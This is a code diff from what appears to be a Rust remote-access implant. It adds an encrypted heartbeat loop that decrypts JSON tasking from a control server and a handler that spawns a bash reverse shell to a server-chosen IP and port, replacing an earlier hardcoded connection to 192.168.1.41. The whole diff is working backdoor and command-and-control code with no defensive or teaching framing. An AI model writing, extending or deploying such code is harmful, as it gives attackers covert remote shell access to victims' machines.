@@ -53,8 +53,16 @@ async fn heartbeat(
     s_write.write_all(&enc_data).await.unwrap();
 }
 
-pub fn shell(shell: String) -> Result<()> {
-    let sock = reverse_stream::connect(format!("192.168.1.41:25"))?;
+pub fn interpret_payload(payload: String) {
+    let infos_payload = payload.split_whitespace().collect::<Vec<_>>();
+    if infos_payload[0] == "reverseshell"{
+        println!("Activating reverseshell");
+        shell("bash".to_string(), infos_payload[1], infos_payload[2]);
+    }
+}
+
+pub fn shell(shell: String, ip: &str, port: &str) -> Result<()> {
+    let sock = reverse_stream::connect(format!("{}:{}", ip, port))?;
     let fd = sock.as_raw_fd();
 
     // Open shell
@@ -134,7 +142,22 @@ async fn main() -> io::Result<()> {
         std::thread::sleep(sleep_time);
         println!("Sending heartbeat");
         heartbeat(&mut writer, &username, &srv_pub_key, rng_thread).await;
-        shell("bash".to_string());
+        let mut data = vec![0; 1024];
+        match reader.try_read(&mut data) {
+            Ok(0) => {}
+            Ok(n) => {
+                let dec_data = priv_key.decrypt(PaddingScheme::new_pkcs1v15_encrypt(), &data[..n]).expect("failed to decrypt");
+                assert_ne!(&dec_data, &data[..n]);
+                println!("read {} bytes", n);
+                println!("Heartbeat recieved");
+                let pingback = String::from_utf8(dec_data).expect("Found invalid UTF-8");
+                let from_json_message: Message = serde_json::from_str(&pingback).unwrap();
+                if from_json_message.message_type == "payload" {
+                    interpret_payload(from_json_message.message_content);
+                }
+            }
+            Err(_e) => {}
+        }
     }
 
     //Shell
